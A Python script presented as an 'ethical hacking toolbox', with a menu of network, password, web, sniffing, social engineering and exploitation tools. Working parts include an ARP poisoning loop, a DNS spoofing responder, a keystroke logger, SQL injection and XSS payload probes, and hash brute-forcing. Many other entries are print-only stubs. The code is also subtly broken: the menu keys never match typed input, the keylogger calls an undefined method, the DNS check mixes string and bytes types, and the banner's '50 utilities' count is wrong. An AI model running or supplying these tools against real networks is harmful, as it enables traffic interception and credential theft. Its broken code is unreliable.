import socket
import hashlib
import requests
import os
import itertools
import subprocess
import whois
import scapy.all as scapy
from pynput.keyboard import Key, Listener
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

class EthicalHackingToolbox:
    def __init__(self):
        self.tools = {
            "1. Network Scanning": self.network_scanning,
            "2. Password Cracking": self.password_cracking,
            "3. Web Vulnerability Testing": self.web_vulnerability_testing,
            "4. Network Sniffing": self.network_sniffing,
            "5. Wireless Attacks": self.wireless_attacks,
            "6. Social Engineering": self.social_engineering,
            "7. Cryptography": self.cryptography,
            "8. Exploitation": self.exploitation,
            "9. Post-Exploitation": self.post_exploitation,
            "10. Reconnaissance": self.reconnaissance,
        }

    def display_banner(self):
        banner = """
        ==========================================
        |           ETHICAL HACKING TOOLBOX      |
        |----------------------------------------|
        |     A Collection of 50 Professional    |
        |        Ethical Hacking Utilities       |
        ==========================================
        """
        print(banner)

    def display_categories(self):
        print("Select a Category:\n")
        for key in self.tools.keys():
            print(f"{key}")

    def network_scanning(self):
        print("Network Scanning Tools:")
        print("1. Port Scanner")
        print("2. Subnet Scanner")
        print("3. ARP Scanner")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.port_scanner()
        elif choice == '2':
            self.subnet_scanner()
        elif choice == '3':
            self.arp_scanner()

    def port_scanner(self):
        target = input("Enter the target IP: ")
        start_port = int(input("Enter the start port: "))
        end_port = int(input("Enter the end port: "))
        
        for port in range(start_port, end_port + 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"Port {port} is open")
            s.close()

    def subnet_scanner(self):
        subnet = input("Enter the subnet (e.g., 192.168.1.0/24): ")
        arp_request = scapy.ARP(pdst=subnet)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        print("IP\t\t\tMAC Address")
        print("-----------------------------------------")
        for element in answered_list:
            print(element[1].psrc + "\t\t" + element[1].hwsrc)

    def arp_scanner(self):
        ip_range = input("Enter the IP range (e.g., 192.168.1.1/24): ")
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        print("IP\t\t\tMAC Address")
        print("-----------------------------------------")
        for element in answered_list:
            print(element[1].psrc + "\t\t" + element[1].hwsrc)

    def password_cracking(self):
        print("Password Cracking Tools:")
        print("1. Dictionary Attack")
        print("2. Brute Force Attack")
        print("3. WPA2 Handshake Cracker")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.dictionary_attack()
        elif choice == '2':
            self.brute_force_attack()
        elif choice == '3':
            self.wpa2_handshake_cracker()

    def dictionary_attack(self):
        password_hash = input("Enter the hashed password: ")
        dictionary = input("Enter the path to the dictionary file: ")

        with open(dictionary, 'r') as file:
            for word in file.readlines():
                word = word.strip()
                hashed_word = hashlib.sha256(word.encode()).hexdigest()
                if hashed_word == password_hash:
                    print(f"Password found: {word}")
                    return
        print("Password not found in dictionary.")

    def brute_force_attack(self):
        password_hash = input("Enter the hashed password: ")
        charset = input("Enter the charset (e.g., abcdefghijklmnopqrstuvwxyz): ")
        max_length = int(input("Enter the maximum length: "))

        for length in range(1, max_length + 1):
            for guess in itertools.product(charset, repeat=length):
                guess = ''.join(guess)
                hashed_guess = hashlib.sha256(guess.encode()).hexdigest()
                if hashed_guess == password_hash:
                    print(f"Password found: {guess}")
                    return
        print("Password not found.")

    def wpa2_handshake_cracker(self):
        # Simulating WPA2 handshake cracking
        print("This tool requires capturing a WPA2 handshake.")
        print("Cracking WPA2 handshakes requires more advanced tools.")
        print("Refer to tools like aircrack-ng for WPA2 handshake cracking.")

    def web_vulnerability_testing(self):
        print("Web Vulnerability Testing Tools:")
        print("1. SQL Injection Tester")
        print("2. XSS Vulnerability Scanner")
        print("3. Directory Bruteforcer")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.sql_injection_tester()
        elif choice == '2':
            self.xss_vulnerability_scanner()
        elif choice == '3':
            self.directory_bruteforcer()

    def sql_injection_tester(self):
        url = input("Enter the target URL: ")
        payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]

        for payload in payloads:
            r = requests.get(url + payload)
            if "SQL" in r.text or "syntax" in r.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload}")
                return
        print("No SQL Injection vulnerability found.")

    def xss_vulnerability_scanner(self):
        url = input("Enter the target URL: ")
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

        for payload in payloads:
            r = requests.get(url + payload)
            if payload in r.text:
                print(f"Possible XSS vulnerability found with payload: {payload}")
                return
        print("No XSS vulnerability found.")

    def directory_bruteforcer(self):
        url = input("Enter the target URL: ")
        wordlist = input("Enter the path to the wordlist: ")

        with open(wordlist, 'r') as file:
            for word in file.readlines():
                word = word.strip()
                test_url = url + "/" + word
                r = requests.get(test_url)
                if r.status_code == 200:
                    print(f"Directory found: {test_url}")
        print("Directory brute-forcing completed.")

    def network_sniffing(self):
        print("Network Sniffing Tools:")
        print("1. Packet Sniffer")
        print("2. DNS Spoofing")
        print("3. ARP Poisoning")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.packet_sniffer()
        elif choice == '2':
            self.dns_spoofing()
        elif choice == '3':
            self.arp_poisoning()

    def packet_sniffer(self):
        interface = input("Enter the network interface (e.g., eth0): ")
        packets = scapy.sniff(iface=interface, count=10)
        packets.show()

    def dns_spoofing(self):
        target_ip = input("Enter the target IP: ")
        spoof_ip = input("Enter the IP to spoof: ")
        iface = input("Enter the network interface (e.g., eth0): ")

        def process_packet(packet):
            if packet.haslayer(scapy.DNSRR):
                qname = packet[scapy.DNSQR].qname
                if target_ip in qname:
                    spoofed_pkt = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                                  scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                  scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd,
                                            an=scapy.DNSRR(rrname=qname, rdata=spoof_ip))
                    scapy.send(spoofed_pkt)
                    print(f"Spoofed DNS response sent for {qname}")

        scapy.sniff(iface=iface, store=False, prn=process_packet)

    def arp_poisoning(self):
        target_ip = input("Enter the target IP: ")
        gateway_ip = input("Enter the gateway IP: ")

        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc

        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        def poison(target_ip, target_mac, spoof_ip):
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)

        try:
            while True:
                poison(target_ip, target_mac, gateway_ip)
                poison(gateway_ip, gateway_mac, target_ip)
        except KeyboardInterrupt:
            print("Stopping ARP poisoning...")

    def wireless_attacks(self):
        print("Wireless Attacks Tools:")
        print("1. Wi-Fi Deauthentication Attack")
        print("2. WPS PIN Attack")
        print("3. WPA Handshake Capture")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.wifi_deauthentication_attack()
        elif choice == '2':
            self.wps_pin_attack()
        elif choice == '3':
            self.wpa_handshake_capture()

    def wifi_deauthentication_attack(self):
        print("This tool requires access to a Wi-Fi card that supports packet injection.")
        print("Refer to tools like aireplay-ng for Wi-Fi deauthentication attacks.")

    def wps_pin_attack(self):
        print("This tool requires access to a Wi-Fi card that supports packet injection.")
        print("Refer to tools like Reaver for WPS PIN attacks.")

    def wpa_handshake_capture(self):
        print("This tool requires access to a Wi-Fi card that supports monitor mode.")
        print("Refer to tools like airodump-ng for WPA handshake capture.")

    def social_engineering(self):
        print("Social Engineering Tools:")
        print("1. Phishing Email Generator")
        print("2. Fake Login Page Generator")
        print("3. Keylogger")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.phishing_email_generator()
        elif choice == '2':
            self.fake_login_page_generator()
        elif choice == '3':
            self.keylogger()

    def phishing_email_generator(self):
        target_email = input("Enter the target email: ")
        subject = input("Enter the email subject: ")
        body = input("Enter the email body: ")

        print(f"Phishing email generated for {target_email} with subject '{subject}'")
        print(f"Body: {body}")
        print("WARNING: This tool is for educational purposes only. Do not use it for malicious activities.")

    def fake_login_page_generator(self):
        print("Fake login page generator is a complex tool.")
        print("Refer to specialized tools or frameworks like SET (Social Engineering Toolkit) for this purpose.")

    def keylogger(self):
        keys = []

        def on_press(key):
            keys.append(key)
            print(f"Key pressed: {key}")
            if len(keys) >= 10:
                self.write_file(keys)
                keys.clear()

        def write_file(keys):
            with open("log.txt", "a") as file:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        file.write('\n')
                    elif k.find("Key") == -1:
                        file.write(k)

        with Listener(on_press=on_press) as listener:
            listener.join()

    def cryptography(self):
        print("Cryptography Tools:")
        print("1. RSA Key Pair Generator")
        print("2. AES Encryption")
        print("3. MD5 Hashing")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.rsa_key_pair_generator()
        elif choice == '2':
            self.aes_encryption()
        elif choice == '3':
            self.md5_hashing()

    def rsa_key_pair_generator(self):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        private_key = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_key = key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        with open("private_key.pem", "wb") as priv_file:
            priv_file.write(private_key)
        with open("public_key.pem", "wb") as pub_file:
            pub_file.write(public_key)

        print("RSA key pair generated and saved as 'private_key.pem' and 'public_key.pem'.")

    def aes_encryption(self):
        print("AES encryption is a complex process.")
        print("Refer to libraries like PyCryptodome for AES encryption and decryption.")

    def md5_hashing(self):
        plaintext = input("Enter the plaintext: ")
        hashed = hashlib.md5(plaintext.encode()).hexdigest()
        print(f"MD5 Hash: {hashed}")

    def exploitation(self):
        print("Exploitation Tools:")
        print("1. Buffer Overflow Exploit")
        print("2. Remote Code Execution")
        print("3. Privilege Escalation")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.buffer_overflow_exploit()
        elif choice == '2':
            self.remote_code_execution()
        elif choice == '3':
            self.privilege_escalation()

    def buffer_overflow_exploit(self):
        print("Buffer overflow exploits require custom crafted payloads.")
        print("Refer to tools like Metasploit for crafting and executing buffer overflow exploits.")

    def remote_code_execution(self):
        print("Remote code execution exploits are highly specialized.")
        print("Refer to tools like Metasploit for remote code execution exploitation.")

    def privilege_escalation(self):
        print("Privilege escalation exploits vary based on the target system.")
        print("Refer to tools like Metasploit for privilege escalation techniques.")

    def post_exploitation(self):
        print("Post-Exploitation Tools:")
        print("1. Rootkit Installation")
        print("2. Data Exfiltration")
        print("3. Covering Tracks")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.rootkit_installation()
        elif choice == '2':
            self.data_exfiltration()
        elif choice == '3':
            self.covering_tracks()

    def rootkit_installation(self):
        print("Rootkit installation is a highly specialized attack.")
        print("Refer to advanced security resources for rootkit installation techniques.")

    def data_exfiltration(self):
        print("Data exfiltration requires advanced network and system manipulation.")
        print("Refer to specialized tools for data exfiltration techniques.")

    def covering_tracks(self):
        print("Covering tracks requires extensive knowledge of the target system.")
        print("Refer to specialized security resources for covering tracks techniques.")

    def reconnaissance(self):
        print("Reconnaissance Tools:")
        print("1. WHOIS Lookup")
        print("2. DNS Lookup")
        print("3. Subdomain Finder")

        choice = input("Choose a tool: ").strip()
        if choice == '1':
            self.whois_lookup()
        elif choice == '2':
            self.dns_lookup()
        elif choice == '3':
            self.subdomain_finder()

    def whois_lookup(self):
        domain = input("Enter the domain name: ")
        domain_info = whois.whois(domain)
        print(domain_info)

    def dns_lookup(self):
        domain = input("Enter the domain name: ")
        result = socket.gethostbyname(domain)
        print(f"DNS Lookup Result: {result}")

    def subdomain_finder(self):
        domain = input("Enter the domain name: ")
        wordlist = input("Enter the path to the subdomain wordlist: ")

        with open(wordlist, 'r') as file:
            for word in file.readlines():
                subdomain = f"{word.strip()}.{domain}"
                try:
                    result = socket.gethostbyname(subdomain)
                    print(f"Subdomain found: {subdomain} -> {result}")
                except socket.error:
                    pass

    def main_menu(self):
        self.display_banner()
        self.display_categories()

        choice = input("Enter the number of the category or type 'exit' to quit: ").strip()
        if choice.lower() == 'exit':
            return
        elif choice in self.tools:
            self.tools[choice]()
        else:
            print("Invalid selection, please try again.")

if __name__ == "__main__":
    toolbox = EthicalHackingToolbox()
    while True:
        toolbox.main_menu()
